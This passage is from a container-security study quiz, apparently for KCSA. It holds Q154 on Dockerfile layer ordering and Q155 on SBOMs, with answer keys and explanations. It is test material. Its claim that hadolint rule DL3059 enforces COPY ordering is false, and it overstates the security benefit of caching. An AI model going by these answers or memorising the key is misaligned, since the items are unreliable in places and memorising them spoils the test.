  │  │ ✅ bash      │   │ ✅ sh        │    │ ❌ NO shell      │   │
  │  │ ✅ curl/wget │   │ ❌ curl      │    │ ❌ NO curl       │   │
  │  │ ✅ apt-get   │   │ ✅ apk       │    │ ❌ NO pkg mgr    │   │
  │  │ ✅ python3   │   │ ❌ python    │    │ ✅ python3       │   │
  │  └──────────────┘   └──────────────┘    └──────────────────┘   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The Trivy scan in CI/CD compares vulnerability counts across base images. A migration from alpine to distroless reduced CVEs from 15 to 5 for the API image. The CI/CD pipeline enforces: 0 CRITICAL, 0 HIGH CVEs. Images exceeding these thresholds fail the build — developers must update dependencies or choose a cleaner base image.

Platform Security Q154 of 200
Why should you use COPY requirements.txt BEFORE COPY . in a Dockerfile?
A) Docker caches each layer. If you COPY . first: any code change invalidates the layer → pip install runs EVERY build (slow + potential dependency confusion attack). If you COPY requirements.txt first: requirements.txt changes rarely → layer is cached → pip install is cached. COPY . changes every commit → only this layer rebuilds (fast). Security benefit: cached dependencies are always installed from the SAME requirements.txt — less chance of dependency poisoning from upstream changes
B) There's no difference — Docker builds all layers from scratch regardless of order
C) COPY requirements.txt first is a Dockerfile syntax requirement — it won't build otherwise
D) The order doesn't matter for security — it only affects build speed
✅ Correct Answer: A

Docker layer caching turns dependency installation from a 5-minute operation into a 1-second one — but only if you order COPY instructions correctly. The key insight: Docker rebuilds a layer and ALL subsequent layers when any input to that layer changes. If COPY . comes first: every code change invalidates all subsequent layers. If COPY requirements.txt comes first: only changes to requirements.txt trigger a full pip install. The security angle: cached dependencies are deterministic — the same requirements.txt always produces the same installed packages. If you rebuild from scratch every time, a dependency could change between builds (dependency confusion, supply chain attack).

📝 Detailed Explanation
Layer Ordering — Cache Efficiency + Security
  ❌ WRONG ORDER (COPY . first):              ✅ CORRECT ORDER (requirements first):
  ┌────────────────────────────┐             ┌──────────────────────────────┐
  │ Layer 1: FROM python:3.12 │             │ Layer 1: FROM python:3.12   │
  │          (cached)          │             │          (cached)            │
  │ Layer 2: COPY . .          │             │ Layer 2: COPY requirements   │
  │          ❌ CHANGED!       │             │          (cached — rare)    │
  │ Layer 3: RUN pip install   │             │ Layer 3: RUN pip install     │
  │          ❌ REBUILT! (slow) │             │          (cached) ✓         │
  │ Layer 4: CMD ...           │             │ Layer 4: COPY . .            │
  │          ❌ REBUILT!       │             │          ❌ CHANGED (only    │
  │                            │             │           this layer rebuilds)│
  │ EVERY CODE CHANGE =        │             │ Layer 5: CMD ...             │
  │ FULL REBUILD (5 min)       │             │          ❌ REBUILT          │
  └────────────────────────────┘             │                              │
                                              │ CODE CHANGE = ~1 sec rebuild │
                                              │ (2 layers, not all 4)        │
                                              └──────────────────────────────┘

For anihpj/jobpost: The Dockerfile carefully orders COPY instructions for maximum caching. Developers experience 5-second builds (not 5-minute builds) because dependencies are cached. The CI/CD pipeline verifies that the Dockerfile respects layer ordering via hadolint rule DL3059. A Dockerfile that copies source code before installing dependencies is flagged as a build performance AND security issue.

5.2 Image RepositoryQ155–Q159

Platform Security Q155 of 200
What is a Software Bill of Materials (SBOM) and what problem does it solve?
A) An SBOM is a license compliance document — it only tracks open-source licenses used
B) An SBOM is a replacement for container image scanning — you don't need Trivy if you have an SBOM
C) An SBOM is a machine-readable NUTRITION LABEL for software: it lists every ingredient — base OS packages (libc6, openssl), language dependencies (Django, requests), and transitive dependencies. When a CVE hits (Log4Shell), query: "Which images contain openssl < 1.1.1t?" → instant answer across ALL images → patch only affected ones. Without SBOM: manual search, hope you don't miss any, pray
D) An SBOM is only required for government software — commercial applications don't benefit from it
✅ Correct Answer: C

An SBOM is your software's complete ingredients list. When Log4Shell (December 2021) hit, organizations without SBOMs spent WEEKS manually checking every container image for log4j. Those with SBOMs ran a single query and had answers in minutes. Standards: SPDX (Linux Foundation), CycloneDX (OWASP). Tools: Syft (generate from image), Trivy (generate + scan). SBOMs are becoming mandatory — US Executive Order 14028 requires them for federal software suppliers. KCSA expects you to understand WHAT an SBOM is, not the specific format details.

SBOM — Your Software Nutrition Label
  $ syft anihpj-api:v1.2.3 -o spdx-json > sbom.json

  ┌────────────────────────────────────────────────────────────┐
  │ PACKAGE              │ VERSION   │ TYPE         │ CVE?    │
  ├────────────────────────────────────────────────────────────┤
  │ Django               │ 4.2.0     │ python       │ CVE-... │
  │ psycopg2             │ 2.9.3     │ python       │ none    │
  │ requests             │ 2.31.0    │ python       │ CVE-... │
